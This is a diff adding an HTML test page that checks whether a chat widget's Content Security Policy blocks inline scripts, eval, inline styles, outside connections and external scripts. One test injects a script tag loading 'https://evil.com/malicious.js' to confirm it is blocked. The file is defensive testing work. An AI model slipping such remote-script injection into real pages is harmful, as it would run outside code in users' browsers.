@@ -1,0 +1,267 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSP Implementation Test</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+        }
+        .test-section {
+            margin: 20px 0;
+            padding: 15px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        .success {
+            background-color: #d4edda;
+            border-color: #c3e6cb;
+            color: #155724;
+        }
+        .error {
+            background-color: #f8d7da;
+            border-color: #f5c6cb;
+            color: #721c24;
+        }
+        .warning {
+            background-color: #fff3cd;
+            border-color: #ffeaa7;
+            color: #856404;
+        }
+        .csp-display {
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 4px;
+            font-family: monospace;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .test-result {
+            margin: 10px 0;
+            padding: 10px;
+            border-radius: 4px;
+        }
+    </style>
+</head>
+<body>
+    <h1>CSP Implementation Test</h1>
+    <p>This page tests the Content Security Policy implementation for the Chat Widget.</p>
+
+    <div class="test-section">
+        <h2>Current CSP Header</h2>
+        <div id="csp-header" class="csp-display">Loading...</div>
+    </div>
+
+    <div class="test-section">
+        <h2>CSP Violation Tests</h2>
+        <p>These tests will attempt to violate CSP policies to verify they are working correctly.</p>
+        
+        <button onclick="testInlineScript()">Test Inline Script</button>
+        <button onclick="testExternalScript()">Test External Script</button>
+        <button onclick="testEval()">Test eval()</button>
+        <button onclick="testInlineStyle()">Test Inline Style</button>
+        <button onclick="testExternalConnection()">Test External Connection</button>
+        
+        <div id="test-results"></div>
+    </div>
+
+    <div class="test-section">
+        <h2>CSP Policy Analysis</h2>
+        <div id="csp-analysis">Analyzing...</div>
+    </div>
+
+    <script>
+        // Function to get current CSP header
+        function getCSPHeader() {
+            const metaTags = document.querySelectorAll('meta[http-equiv="Content-Security-Policy"]');
+            if (metaTags.length > 0) {
+                return metaTags[0].getAttribute('content');
+            }
+            
+            // Check if CSP is set via HTTP headers (development server)
+            fetch(window.location.href)
+                .then(response => {
+                    const cspHeader = response.headers.get('Content-Security-Policy');
+                    if (cspHeader) {
+                        document.getElementById('csp-header').textContent = cspHeader;
+                        analyzeCSP(cspHeader);
+                    } else {
+                        document.getElementById('csp-header').textContent = 'No CSP header found in HTTP headers';
+                    }
+                })
+                .catch(error => {
+                    console.error('Error fetching CSP header:', error);
+                });
+            
+            return 'Checking HTTP headers...';
+        }
+
+        // Function to analyze CSP policy
+        function analyzeCSP(csp) {
+            const analysis = {
+                'default-src': csp.includes("default-src 'self'"),
+                'script-src': csp.includes("script-src 'self'"),
+                'style-src': csp.includes("style-src 'self'"),
+                'connect-src': csp.includes('connect-src'),
+                'img-src': csp.includes('img-src'),
+                'object-src': csp.includes("object-src 'none'"),
+                'frame-ancestors': csp.includes("frame-ancestors 'none'"),
+                'upgrade-insecure-requests': csp.includes('upgrade-insecure-requests')
+            };
+
+            let analysisHtml = '<h3>Policy Components:</h3><ul>';
+            for (const [directive, present] of Object.entries(analysis)) {
+                const status = present ? '✅' : '❌';
+                analysisHtml += `<li>${status} ${directive}: ${present ? 'Present' : 'Missing'}</li>`;
+            }
+            analysisHtml += '</ul>';
+
+            // Check for security best practices
+            const bestPractices = [];
+            if (csp.includes("'unsafe-inline'")) {
+                bestPractices.push('⚠️ Contains unsafe-inline - consider using nonce or hash');
+            }
+            if (csp.includes("'unsafe-eval'")) {
+                bestPractices.push('⚠️ Contains unsafe-eval - avoid if possible');
+            }
+            if (!csp.includes("'unsafe-inline'") && !csp.includes("'unsafe-eval'")) {
+                bestPractices.push('✅ Strict policy - no unsafe directives');
+            }
+
+            if (bestPractices.length > 0) {
+                analysisHtml += '<h3>Security Recommendations:</h3><ul>';
+                bestPractices.forEach(practice => {
+                    analysisHtml += `<li>${practice}</li>`;
+                });
+                analysisHtml += '</ul>';
+            }
+
+            document.getElementById('csp-analysis').innerHTML = analysisHtml;
+        }
+
+        // Test functions
+        function testInlineScript() {
+            try {
+                // This should be blocked by CSP if unsafe-inline is not allowed
+                const testResult = document.createElement('div');
+                testResult.className = 'test-result error';
+                testResult.innerHTML = '❌ Inline script executed - CSP may be too permissive';
+                document.getElementById('test-results').appendChild(testResult);
+                
+                // Try to execute inline script
+                eval('console.log("Inline script test")');
+            } catch (error) {
+                const testResult = document.createElement('div');
+                testResult.className = 'test-result success';
+                testResult.innerHTML = '✅ Inline script blocked by CSP';
+                document.getElementById('test-results').appendChild(testResult);
+            }
+        }
+
+        function testExternalScript() {
+            const testResult = document.createElement('div');
+            testResult.className = 'test-result';
+            
+            const script = document.createElement('script');
+            script.src = 'https://evil.com/malicious.js';
+            script.onload = () => {
+                testResult.className += ' error';
+                testResult.innerHTML = '❌ External script loaded - CSP may be too permissive';
+            };
+            script.onerror = () => {
+                testResult.className += ' success';
+                testResult.innerHTML = '✅ External script blocked by CSP';
+            };
+            
+            document.getElementById('test-results').appendChild(testResult);
+            document.head.appendChild(script);
+        }
+
+        function testEval() {
+            try {
+                eval('console.log("Eval test")');
+                const testResult = document.createElement('div');
+                testResult.className = 'test-result warning';
+                testResult.innerHTML = '⚠️ eval() executed - CSP allows unsafe-eval';
+                document.getElementById('test-results').appendChild(testResult);
+            } catch (error) {
+                const testResult = document.createElement('div');
+                testResult.className = 'test-result success';
+                testResult.innerHTML = '✅ eval() blocked by CSP';
+                document.getElementById('test-results').appendChild(testResult);
+            }
+        }
+
+        function testInlineStyle() {
+            const testResult = document.createElement('div');
+            testResult.style.color = 'red';
+            testResult.className = 'test-result';
+            
+            // Check if inline styles are applied
+            const computedStyle = window.getComputedStyle(testResult);
+            if (computedStyle.color === 'rgb(255, 0, 0)' || computedStyle.color === 'red') {
+                testResult.className += ' warning';
+                testResult.innerHTML = '⚠️ Inline styles applied - CSP allows unsafe-inline for styles';
+            } else {
+                testResult.className += ' success';
+                testResult.innerHTML = '✅ Inline styles blocked by CSP';
+            }
+            
+            testResult.innerHTML += ' (This text should be red if inline styles are allowed)';
+            document.getElementById('test-results').appendChild(testResult);
+        }
+
+        function testExternalConnection() {
+            const testResult = document.createElement('div');
+            testResult.className = 'test-result';
+            
+            fetch('https://httpbin.org/get')
+                .then(response => {
+                    testResult.className += ' warning';
+                    testResult.innerHTML = '⚠️ External connection allowed - CSP permits this domain';
+                })
+                .catch(error => {
+                    testResult.className += ' success';
+                    testResult.innerHTML = '✅ External connection blocked by CSP';
+                });
+            
+            testResult.innerHTML = 'Testing external connection...';
+            document.getElementById('test-results').appendChild(testResult);
+        }
+
+        // Initialize page
+        document.addEventListener('DOMContentLoaded', () => {
+            const cspHeader = getCSPHeader();
+            if (cspHeader && cspHeader !== 'Checking HTTP headers...') {
+                document.getElementById('csp-header').textContent = cspHeader;
+                analyzeCSP(cspHeader);
+            }
+        });
+
+        // Listen for CSP violations
+        document.addEventListener('securitypolicyviolation', (event) => {
+            const violationDiv = document.createElement('div');
+            violationDiv.className = 'test-result error';
+            violationDiv.innerHTML = `🚨 CSP Violation: ${event.violatedDirective} - ${event.blockedURI}`;
+            document.getElementById('test-results').appendChild(violationDiv);
+        });
+    </script>
+</body>
+</html>
